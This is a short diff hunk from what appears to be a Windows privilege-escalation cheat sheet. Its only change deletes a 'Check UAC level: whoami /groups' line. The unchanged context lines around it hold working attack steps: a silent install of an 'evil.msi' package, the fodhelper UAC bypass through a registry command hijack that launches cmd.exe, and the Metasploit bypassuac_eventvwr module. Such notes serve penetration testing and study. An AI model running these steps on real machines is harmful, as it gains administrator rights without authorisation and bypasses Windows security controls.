@@ -68,7 +68,7 @@ $ msiexec /quiet /qn /i C:\evil.msi
 4. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
 5. run fodhelper.exe, whoami /groups
 ```
-Check UAC level: whoami /groups
+
 ```
 use exploit/windows/local/bypassuac_eventvwr
 set session 1
